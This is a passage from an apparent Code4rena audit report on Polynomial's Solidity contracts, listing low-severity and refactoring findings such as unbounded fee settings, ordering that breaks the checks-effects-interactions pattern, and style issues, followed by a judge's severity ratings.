        SUSD.safeTransferFrom(msg.sender, address(this), amountForTokens);
        ...
    }
```

```solidity
    function withdraw(uint256 tokens, address user) external override nonReentrant whenNotPaused("POOL_WITHDRAW") {
        ...
        uint256 tokenPrice = getTokenPrice();
        uint256 susdToReturn = tokens.mulWadDown(tokenPrice);
        uint256 fees = susdToReturn.mulWadDown(withdrawalFee);
        SUSD.safeTransfer(feeReceipient, fees);
        SUSD.transfer(user, susdToReturn - fees);
        totalFunds -= susdToReturn;
        liquidityToken.burn(msg.sender, tokens);
        ...
    }
```

Moreover, the `LiquidityPool.setDevFee` function has no limit for setting `devFee`, and similar issues can occur. For example, if `devFee` is set to more than 1e18, calling the `LiquidityPool.openLong` function will revert because `externalFee` is more than `feesCollected` and executing `feesCollected - externalFee` reverts.

As a mitigation, to prevent the `LiquidityPool.deposit`, `LiquidityPool.withdraw`, and `LiquidityPool.openLong` functions from behaving unexpectedly, the `LiquidityPool.setFees` and `LiquidityPool.setDevFee` functions can be updated to only allow the corresponding fees to be set to values that cannot exceed certain limits, which are reasonable values that are less than 1e18.

```solidity
    function setDevFee(uint256 _devFee) external requiresAuth {
        emit UpdateDevFee(devFee, _devFee);
        devFee = _devFee;
    }
```

```solidity
    function openLong(uint256 amount, address user, bytes32 referralCode)
        external
        override
        onlyExchange
        nonReentrant
        returns (uint256 totalCost)
    {
        ...
        uint256 tradeCost = amount.mulWadDown(markPrice);
        uint256 fees = orderFee(int256(amount));
        totalCost = tradeCost + fees;

        SUSD.safeTransferFrom(user, address(this), totalCost);

        uint256 hedgingFees = _hedge(int256(amount), false);
        uint256 feesCollected = fees - hedgingFees;
        uint256 externalFee = feesCollected.mulWadDown(devFee);

        SUSD.safeTransfer(feeReceipient, externalFee);

        usedFunds -= int256(tradeCost);
        totalFunds += feesCollected - externalFee;
        ...
    }
```

## [02] SOME FUNCTIONS DO NOT FOLLOW CHECKS-EFFECTS-INTERACTIONS PATTERN
Functions like `LiquidityPool.withdraw` and `ShortCollateral.collectCollateral` below transfer the corresponding tokens before updating the relevant states, which do not follow the checks-effects-interactions pattern. In contrast, functions like `LiquidityPool.deposit` and `ShortCollateral.sendCollateral` below transfer the corresponding tokens after updating the relevant states. To reduce the potential attack surface and increase the level of security, please consider updating the functions that do not follow the checks-effects-interactions pattern to follow such pattern.

```solidity
    function withdraw(uint256 tokens, address user) external override nonReentrant whenNotPaused("POOL_WITHDRAW") {
        ...
        SUSD.safeTransfer(feeReceipient, fees);
        SUSD.transfer(user, susdToReturn - fees);
        totalFunds -= susdToReturn;
        liquidityToken.burn(msg.sender, tokens);
        ...
    }
```

```solidity
    function collectCollateral(address collateral, uint256 positionId, uint256 amount)
        external
        onlyExchange
        nonReentrant
    {
        ERC20(collateral).safeTransferFrom(address(exchange), address(this), amount);

        UserCollateral storage userCollateral = userCollaterals[positionId];

        if (userCollateral.collateral == address(0x0)) {
            userCollateral.collateral = collateral;
        }

        userCollateral.amount += amount;
        ...
    }
```

```solidity
    function deposit(uint256 amount, address user) external override nonReentrant whenNotPaused("POOL_DEPOSIT") {
        uint256 tokenPrice = getTokenPrice();
        uint256 fees = amount.mulWadDown(depositFee);
        uint256 amountForTokens = amount - fees;
        uint256 tokensToMint = amountForTokens.divWadDown(tokenPrice);
        liquidityToken.mint(user, tokensToMint);
        totalFunds += amountForTokens;
        SUSD.safeTransferFrom(msg.sender, feeReceipient, fees);
        SUSD.safeTransferFrom(msg.sender, address(this), amountForTokens);

        emit Deposit(user, amount, fees, tokensToMint);
    }
```
```solidity
    function sendCollateral(uint256 positionId, uint256 amount) external override onlyExchange nonReentrant {
        UserCollateral storage userCollateral = userCollaterals[positionId];

        userCollateral.amount -= amount;

        address user = shortToken.ownerOf(positionId);

        ERC20(userCollateral.collateral).safeTransfer(user, amount);

        emit SendCollateral(positionId, userCollateral.collateral, amount);
    }
```

## [03] `nonReentrant` MODIFIER CAN BE PLACED AND EXECUTED BEFORE OTHER MODIFIERS IN FUNCTIONS
As a best practice, the `nonReentrant` modifier could be placed and executed before other modifiers in functions to prevent reentrancies through other modifiers and make code more efficient. To follow the best practice, please consider placing the `nonReentrant` modifier before the `requiresAuth` modifier in the following functions.

```solidity
src\KangarooVault.sol
  376: function openPosition(uint256 amt, uint256 minCost) external requiresAuth nonReentrant {    
  383: function closePosition(uint256 amt, uint256 maxCost) external requiresAuth nonReentrant {    
  389: function clearPendingOpenOrders(uint256 maxCost) external requiresAuth nonReentrant {    
  395: function clearPendingCloseOrders(uint256 minCost) external requiresAuth nonReentrant {    
  401: function transferPerpMargin(int256 marginDelta) external requiresAuth nonReentrant {    
  424: function addCollateral(uint256 additionalCollateral) external requiresAuth nonReentrant {    
  436: function removeCollateral(uint256 collateralToRemove) external requiresAuth nonReentrant {    
  450: function executePerpOrders(bytes[] calldata priceUpdateData) external payable requiresAuth nonReentrant {
```

## [04] REDUNDANT `return` KEYWORDS IN `ShortToken.transferFrom` and `ShortToken.safeTransferFrom` FUNCTIONS
The following `ShortToken.transferFrom` and `ShortToken.safeTransferFrom` functions do not have `returns` but have `return` statements. Moreover, Solmate's corresponding `ERC721.transferFrom` and `ERC721.safeTransferFrom` functions do not return anything. Thus, these `ShortToken.transferFrom` and `ShortToken.safeTransferFrom` functions' `return` keywords are redundant. To improve the code quality, please consider removing the `return` keywords from these functions.

```solidity
    function transferFrom(address _from, address _to, uint256 _id) public override {
        require(powerPerp.balanceOf(_to) == 0, "Receiver has long positions");
        return ERC721.transferFrom(_from, _to, _id);
    }

    function safeTransferFrom(address _from, address _to, uint256 _id) public override {
        require(powerPerp.balanceOf(_to) == 0, "Receiver has long positions");
        return ERC721.safeTransferFrom(_from, _to, _id);
    }

    function safeTransferFrom(address _from, address _to, uint256 _id, bytes calldata data) public override {
        require(powerPerp.balanceOf(_to) == 0, "Receiver has long positions");
        return ERC721.safeTransferFrom(_from, _to, _id, data);
    }
```

## [05] CONSTANTS CAN BE USED INSTEAD OF MAGIC NUMBERS
To improve readability and maintainability, a constant can be used instead of the magic number. Please consider replacing the magic numbers, such as `1e18`, used in the following code with constants.

```solidity
src\Exchange.sol
  191: fundingRate = fundingRate / 1 days; 
  197: int256 normalizationUpdate = 1e18 - totalFunding;   

src\ShortCollateral.sol
  235: if (safetyRatio > 1e18) return maxDebt; 
  237: maxDebt = position.shortAmount / 2; 
```

## [06] HARDCODED STRING THAT IS REPEATEDLY USED CAN BE REPLACED WITH A CONSTANT
`sUSD` is repeatedly used in the `ShortCollateral` contract. For better maintainability, please consider replacing it with a constant.

```solidity
    constructor(uint256 susdRatio, uint256 susdLiqRatio, uint256 susdLiqBonus, ISystemManager _systemManager)
        Auth(msg.sender, Authority(address(0x0)))
    {
        ...
        Collateral storage susd = collaterals["sUSD"];
        susd.currencyKey = "sUSD";
        ...
    }

    function refresh() public {
        ...
        Collateral storage susd = collaterals["sUSD"];
        susd.synth = synthetixAdapter.getSynth("sUSD");
    }
```

## [07] `ShortToken.adjustPosition` FUNCTION DOES NOT NEED TO UPDATE `totalShorts` and `position.shortAmount` IN CERTAIN CASE
When calling the following `ShortToken.adjustPosition` function, if `positionId == 0` is false and `shortAmount` equals `position.shortAmount`, `totalShorts` and `position.shortAmount` will be unchanged. Hence, to increase the code's efficiency, this function can be updated to not update `totalShorts` and `position.shortAmount` in this case.

```solidity
    function adjustPosition(
        uint256 positionId,
        address trader,
        address collateral,
        uint256 shortAmount,
        uint256 collateralAmount
    ) external onlyExchange returns (uint256) {
        if (positionId == 0) {
            ...
        } else {
            require(trader == ownerOf(positionId));

            ShortPosition storage position = shortPositions[positionId];

            if (shortAmount >= position.shortAmount) {
                totalShorts += shortAmount - position.shortAmount;
            } else {
                totalShorts -= position.shortAmount - shortAmount;
            }

            position.collateralAmount = collateralAmount;
            position.shortAmount = shortAmount;

            if (position.shortAmount == 0) {
                _burn(positionId);
            }
        }
        ...
    }
```

## [08] `LiquidityPool.withdraw` FUNCTION CALLS BOTH `SUSD.safeTransfer` AND `SUSD.transfer`
The `LiquidityPool.withdraw` function calls `SUSD.safeTransfer(feeReceipient, fees)` and `SUSD.transfer(user, susdToReturn - fees)`. For consistency and a higher level of security, the `LiquidityPool.withdraw` function can be updated to call `SUSD.safeTransfer(user, susdToReturn - fees)` instead of `SUSD.transfer(user, susdToReturn - fees)`.

```solidity
    function withdraw(uint256 tokens, address user) external override nonReentrant whenNotPaused("POOL_WITHDRAW") {
        ...
        SUSD.safeTransfer(feeReceipient, fees);
        SUSD.transfer(user, susdToReturn - fees);
        ...
    }
```

## [09] `LiquidityPool.orderFee` FUNCTION CAN CALL `getMarkPrice()` INSTEAD OF `exchange.getMarkPrice()`
The following `LiquidityPool.orderFee` function calls `exchange.getMarkPrice()` while all other functions in the same contract that need to call `exchange.getMarkPrice()`, such as the `LiquidityPool.getTokenPrice` function below, call `getMarkPrice()` instead. To make code more consistent and better, please consider updating the `LiquidityPool.orderFee` function to call `getMarkPrice()` instead of `exchange.getMarkPrice()`.

```solidity
    function orderFee(int256 sizeDelta) public view override returns (uint256) {
        ...
        (uint256 markPrice,) = exchange.getMarkPrice();
        ...
    }
```

```solidity
    function getTokenPrice() public view override returns (uint256) {
        ...
        (uint256 markPrice, bool isInvalid) = getMarkPrice();
        ...
    }
```

```solidity
    function getMarkPrice() public view override returns (uint256, bool) {
        return exchange.getMarkPrice();
    }
```

## [10] IMMUTABLES CAN BE NAMED USING SAME CONVENTION
As shown below, some immutables are named using capital letters and underscores while some are not. For a better code quality, please consider naming these immutables using the same naming convention.

```solidity
src\Exchange.sol
  34: uint256 public immutable override PRICING_CONSTANT;

src\KangarooVault.sol
  60: bytes32 public immutable name;
  63: bytes32 public immutable UNDERLYING_SYNTH_KEY;
  66: ERC20 public immutable SUSD;
  69: IVaultToken public immutable VAULT_TOKEN;
  72: IExchange public immutable EXCHANGE;
  75: ILiquidityPool public immutable LIQUIDITY_POOL;
  78: IPerpsV2Market public immutable PERP_MARKET;

src\LiquidityPool.sol
  56: bytes32 public immutable baseAsset;
  65: ERC20 public immutable SUSD;

src\LiquidityToken.sol
  8: bytes32 public immutable marketKey;
  10: ISystemManager public immutable systemManager;

src\PowerPerp.sol
  9: bytes32 public immutable marketKey;
  10: ISystemManager public immutable systemManager;

src\ShortCollateral.sol
  46: ISystemManager public immutable systemManager;

src\ShortToken.sol
  9: bytes32 public immutable marketKey;
  11: ISystemManager public immutable systemManager;

src\SystemManager.sol
  21: bytes32 public immutable baseAsset;
  24: ERC20 public immutable SUSD;
  27: bytes32 public immutable PERP_MARKET_CONTRACT;
```

## [11] UNUSED IMPORT
The `IFuturesMarket` interface is not used in the `SystemManager` contract. Please consider removing the corresponding `import` statement for better readability and maintainability.

```solidity
import {IFuturesMarket} from "./interfaces/synthetix/IFuturesMarket.sol";
...
contract SystemManager is ISystemManager, Auth {
```

## [12] FLOATING PRAGMAS
It is a best practice to lock pragmas instead of using floating pragmas to ensure that contracts are tested and deployed with the intended compiler version. Accidentally deploying contracts with different compiler versions can lead to unexpected risks and undiscovered bugs. Please consider locking pragmas for the following files.

```solidity
src\Exchange.sol
  2: pragma solidity ^0.8.9; 

src\KangarooVault.sol
  2: pragma solidity ^0.8.9; 

src\LiquidityPool.sol
  2: pragma solidity ^0.8.9; 

src\LiquidityToken.sol
  2: pragma solidity ^0.8.9; 

src\PowerPerp.sol
  2: pragma solidity ^0.8.9; 

src\ShortCollateral.sol
  2: pragma solidity ^0.8.9; 

src\ShortToken.sol
  2: pragma solidity ^0.8.9; 

src\SynthetixAdapter.sol
  2: pragma solidity ^0.8.9; 

src\SystemManager.sol
  2: pragma solidity ^0.8.9; 

src\libraries\SignedMath.sol
  2: pragma solidity ^0.8.9; 

src\utils\PauseModifier.sol
  3: pragma solidity ^0.8.9; 
```

## [13] SOLIDITY VERSION `0.8.19` CAN BE USED
Using the more updated version of Solidity can enhance security. As described in https://github.com/ethereum/solidity/releases, Version `0.8.19` is the latest version of Solidity, which "contains a fix for a long-standing bug that can result in code that is only used in creation code to also be included in runtime bytecode". To be more secured and more future-proofed, please consider using Version `0.8.19` for all contracts, including the `VaultToken` contract that uses Version `0.8.9` currently.

```solidity
pragma solidity 0.8.9;
```

## [14] ORDERS OF LAYOUT DO NOT FOLLOW OFFICIAL STYLE GUIDE
https://docs.soliditylang.org/en/v0.8.19/style-guide.html#order-of-layout suggests that the following order should be used in a contract:
1. Type declarations
2. State variables
3. Events
4. Errors
5. Modifiers
6. Functions

Events or error are placed after functions in the following contracts. To follow the official style guide, please consider placing these events or error before all functions in these contracts.

```solidity
src\ShortCollateral.sol
  16: contract ShortCollateral is IShortCollateral, Auth, ReentrancyGuard {    

src\ShortToken.sol
  8: contract ShortToken is ERC721 {  

src\SystemManager.sol
  19: contract SystemManager is ISystemManager, Auth {  

src\VaultToken.sol
  6: contract VaultToken is ERC20 {  
```

## [15] INCOMPLETE NATSPEC COMMENTS
NatSpec comments provide rich code documentation. The following functions miss the `@param` and/or `@return` comments. Please consider completing the NatSpec comments for these functions.

```solidity
src\Exchange.sol
  87: function openTrade(TradeParams memory tradeParams)  
  155: function getIndexPrice() public view override returns (uint256 indexPrice, bool isInvalid) {    
  186: function getMarkPrice() public view override returns (uint256 markPrice, bool isInvalid) {  
  233: function _openTrade(TradeParams memory params) internal returns (uint256, uint256) {    

src\LiquidityPool.sol
  379: function orderFee(int256 sizeDelta) public view override returns (uint256) {    
  399: function baseAssetPrice() public view override returns (uint256 spotPrice, bool isInvalid) {    
  409: function getSkew() external view override returns (int256) {    
  430: function openLong(uint256 amount, address user, bytes32 referralCode)   
  720: function _getSkew() internal view returns (int256 skew) {   
  727: function _getDelta() internal view returns (uint256 delta) {   
  798: function _hedge(int256 size, bool isLiquidation) internal returns (uint256 hedgingFees) {   

src\ShortCollateral.sol
  121: function liquidate(uint256 positionId, uint256 debt, address user)  
  153: function getMinCollateral(uint256 shortAmount, address collateral)  
  176: function getLiquidationBonus(address collateral, uint256 collateralAmount)  
  192: function canLiquidate(uint256 positionId) public view override returns (bool) { 
  215: function maxLiquidatableDebt(uint256 positionId) public view override returns (uint256 maxDebt) {
```

## [16] MISSING NATSPEC COMMENTS
NatSpec comments provide rich code documentation. The following functions miss NatSpec comments. Please consider adding NatSpec comments for these functions.

```solidity
src\LiquidityToken.sol
  19: function refresh() public { 
  28: function mint(address _user, uint256 _amt) public onlyPool { 
  32: function burn(address _user, uint256 _amt) public onlyPool { 

src\PowerPerp.sol
  22: function refresh() public { 
  32: function mint(address _user, uint256 _amt) public onlyExchange { 
  36: function burn(address _user, uint256 _amt) public onlyExchange { 
  40: function transfer(address _to, uint256 _amount) public override returns (bool) { 
  45: function transferFrom(address _from, address _to, uint256 _amount) public override returns (bool) { 

src\ShortToken.sol
  33: function refresh() public {
  44: function tokenURI(uint256 tokenId) public view override returns (string memory) { 
  48: function adjustPosition(    
  92: function transferFrom(address _from, address _to, uint256 _id) public override { 
  97: function safeTransferFrom(address _from, address _to, uint256 _id) public override { 
  102: function safeTransferFrom(address _from, address _to, uint256 _id, bytes calldata data) public override { 

src\SynthetixAdapter.sol
  18: function getSynth(bytes32 key) public view override returns (address synth) {   
  22: function getCurrencyKey(address synth) public view override returns (bytes32 key) {   
  26: function getAssetPrice(bytes32 key) public view override returns (uint256, bool) {   

src\SystemManager.sol
  62: function init(  
  84: function refreshSynthetixAddresses() public {  
  89: function setStatusFunction(bytes32 key, bool status) public requiresAuth {

src\VaultToken.sol
  27: function mint(address _user, uint256 _amt) external onlyVault { 
  31: function burn(address _user, uint256 _amt) external onlyVault { 
  35: function setVault(address _vault) external {    

src\libraries\SignedMath.sol
  5: function signedAbs(int256 x) internal pure returns (int256) {   
  9: function abs(int256 x) internal pure returns (uint256) {   
  13: function max(int256 x, int256 y) internal pure returns (int256) {   
  17: function min(int256 x, int256 y) internal pure returns (int256) {   
```

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/99#issuecomment-1484276566):**
 > **[01]: LACK OF LIMITS FOR SETTING FEES**<br>
> `Low`<br>
> 
> **[02]: SOME FUNCTIONS DO NOT FOLLOW CHECKS-EFFECTS-INTERACTIONS PATTERN**<br>
> `Low` (would've been `Refactor` without the detailed explanation and comparison)<br>
> 
> **[03]: nonReentrant MODIFIER CAN BE PLACED AND EXECUTED BEFORE OTHER MODIFIERS IN FUNCTIONS**<br>
> `Non-Critical`<br>
> 
> **[04]: REDUNDANT return KEYWORDS IN ShortToken.transferFrom and ShortToken.safeTransferFrom FUNCTIONS**<br>
> Valid `Refactor` and interesting one at that (good signal)<br>
> 
> **[05]: CONSTANTS CAN BE USED INSTEAD OF MAGIC NUMBERS**<br>
> `Refactor`<br>
> 
> **[06]: HARDCODED STRING THAT IS REPEATEDLY USED CAN BE REPLACED WITH A CONSTANT**<br>
> `Refactor`<br>
> 
> **[07]: ShortToken.adjustPosition FUNCTION DOES NOT NEED TO UPDATE totalShorts and position.shortAmount IN CERTAIN CASE**<br>
> `Refactor`/`Gas` (good one)<br>
> 
> **[08]: LiquidityPool.withdraw FUNCTION CALLS BOTH SUSD.safeTransfer AND SUSD.transfer**<br>
> Would've said `Out-of-Scope` but additional details make this relevant. `Refactor`.<br>
> 
> **[09]: LiquidityPool.orderFee FUNCTION CAN CALL getMarkPrice() INSTEAD OF exchange.getMarkPrice()**<br>
> `Refactor`, good one.<br>
> 
> Rest is generic `Refactor`.
> 
> Good report with a good signal.
>
 > Also including [Issue 228](https://github.com/code-423n4/2023-03-polynomial-findings/issues/228) from the warden as Low.



***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
